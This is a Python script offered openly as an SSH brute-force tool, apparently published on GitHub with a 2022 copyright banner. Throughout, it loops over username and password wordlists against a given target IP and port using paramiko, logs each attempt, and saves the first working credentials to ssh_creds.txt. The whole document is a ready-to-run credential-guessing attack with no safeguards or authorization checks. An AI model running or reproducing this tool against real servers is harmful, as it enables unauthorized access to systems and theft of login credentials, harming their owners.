#!/usr/bin/env python3
import sys
import os
import socket
import paramiko
import argparse
import ipaddress

# colored text and background
def colorRed(clr): print("\033[91m {}\033[00m".format(clr))
def colorGreen(clr): print("\033[92m {}\033[00m".format(clr))
def colorYellow(clr): print("\033[93m {}\033[00m".format(clr))
def colorLightPurple(clr): print("\033[94m {}\033[00m".format(clr))
def colorPurple(clr): print("\033[95m {}\033[00m".format(clr))
def colorCyan(clr): print("\033[96m {}\033[00m".format(clr))
def colorLightGray(clr): print("\033[97m {}\033[00m".format(clr))
def colorBlack(clr): print("\033[98m {}\033[00m".format(clr))
def colorReset(clr): print("\033[0m {}\033[00m".format(clr))

# init the parser
parser = argparse.ArgumentParser()

# establish the accepted args
parser.add_argument('-ip', dest='_target_ip', type=str,
                    help='ip address of the target')
parser.add_argument('-port', dest='_target_port', type=str,
                    help='port of active ssh server')
parser.add_argument('-u', dest='_user_list', type=str,
                    help='path to list of usernames')
parser.add_argument('-p', dest='_pass_list', type=str,
                    help='path to list of passwords')

# parse the args
args = parser.parse_args()

# assign arg values to script vars
target_ip = args._target_ip
target_port = args._target_port
user_list = args._user_list
pass_list = args._pass_list

# clear
def clear_screen():
    # for windows OS
    if os.name == "nt":
        os.system("cls")

        # for linux / Mac OS
    else:
        os.system("clear")

clear_screen()

banner = '''
 ______     __     ______   ______     __  __     __   __     ______    
/\___  \   /\ \   /\__  _\ /\  __ \   /\ \/\ \   /\ "-.\ \   /\  ___\    
\/_/  /__  \ \ \  \/_/\ \/ \ \ \/\ \  \ \ \_\ \  \ \ \-.  \  \ \  __\   
  /\_____\  \ \_\    \ \_\  \ \_____\  \ \_____\  \ \_\\"\_ \  \ \_____\ 
  \/_____/   \/_/     \/_/   \/_____/   \/_____/   \/_/ \/_/   \/_____/ 


***********************************************************************
*                  Copyright of Hamza MOUNIR, 2022                    *
*                   https://github.com/ZITZITOUNE                     *
***********************************************************************
'''
colorRed(banner)

# check if any arg is left empty
if (target_ip is None or target_port is None or user_list is None or pass_list is None):
    print("\n[-] Enter a valid ip address, port, username list, and password list!")
    print("\n[-] For example : python3 ssh_bruteforce.py -ip 192.168.1.1 -port 22 -u word.txt -p word.txt")
    exit()

# check if the ip address is valid
try:
    ip = ipaddress.ip_address(target_ip)
    pass
except ValueError:
    colorRed("You entered an invalid ip address")
    exit()
    
# check that the port is valid
if (int(target_port) <= 0 or int(target_port) > 65535):
    print("\n[-] The port number must be between 1 and 65535 !")
    exit()

# check to make sure can access to wordlist
if os.path.exists(user_list) and os.path.exists(pass_list):
    u = open(user_list, "r")
    p = open(pass_list, "r", encoding="ISO-8859-1")

    usernames_imported = len(u.readlines())
    passwords_imported = len(p.readlines())

    print("\n[*] {} usernames and {} passwords have been imported!".format(
        usernames_imported, passwords_imported))
else:
    colorYellow("\n[-] Wordlist file not found !")
    sys.exit()

#status
begin_status = target_ip + ":" + target_port
print("\n[+] Starting bruteforce attack on {}\n".format(begin_status))

#login SSH with paramiko
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

# function to login to ssh with parameters
def ssh_login(ip_addr, port, username, password):
    try:
        auth = client.connect(
            ip_addr, port, username=f'{username}', password=f'{password}', timeout=2)
        
    # if authentication fails
    except paramiko.AuthenticationException:
        return False
    
    # if the server times out, or that the connection has not been established
    except socket.error:
        colorRed("\nUnable to connect to SSH server ! \n")
        exit()

    # if there is other random error
    except Exception as e:

        print("ERROR! \n")

    # if the authentication is successful
    else:

        return True

# Bruteforce
compteur = 0

# open user_list
with open(user_list, "r") as working_users:

    for user in working_users:
        user = user.strip("\n")
        with open(pass_list, "r") as working_passwords:
            for password in working_passwords:
                password = password.strip("\n")
                if ssh_login(target_ip, target_port, user, password) == True:
                    compteur += 1
                    
                    # notification if correct credentials    
                    colorGreen("[+] [ATTEMPT {}][SUCCESS] \nUsername: {} \nPassword: {}".format(
                        compteur, user, password))
                    
                    # save credentials
                    open("ssh_creds.txt", "w").write(
                        f"\nHost: {target_ip}\nPort: {target_port}\nUsername: {user}\nPassword: {password}")
                    print("\nCredentials saved to ssh_creds.txt!")
                    
                    # exit
                    exit()
                else:
                    compteur += 1
                    
                    # notification if wrong credentials
                    colorRed("[+] [ATTEMPT {}][FAILURE] \nUsername: {} \nPassword: {}\n".format(
                        compteur, user, password))